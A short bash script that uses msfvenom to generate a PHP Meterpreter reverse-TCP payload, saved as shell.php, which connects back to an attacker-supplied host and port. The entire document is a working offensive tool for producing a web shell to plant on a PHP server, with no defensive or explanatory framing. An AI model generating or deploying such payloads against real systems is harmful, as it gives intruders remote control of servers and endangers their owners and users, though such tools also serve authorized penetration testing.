#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "[i] Usage: $0 <LHOST> <LPORT> "
    exit 1
fi

LHOST="$1"
LPORT="$2"
OUTPUT_FILE="shell.php"

if ! command -v msfvenom &> /dev/null; then
    echo "[x] Error: msfvenom is not installed or not in PATH."
    exit 1
fi

echo "[x] Generating PHP reverse shell with:"
echo "    LHOST = $LHOST"
echo "    LPORT = $LPORT"

msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > "$OUTPUT_FILE"
if [ -f "$OUTPUT_FILE" ]; then
    echo "[+] Payload successfully saved to $OUTPUT_FILE"
else
    echo "[-] Failed to create payload."
    exit 1
fi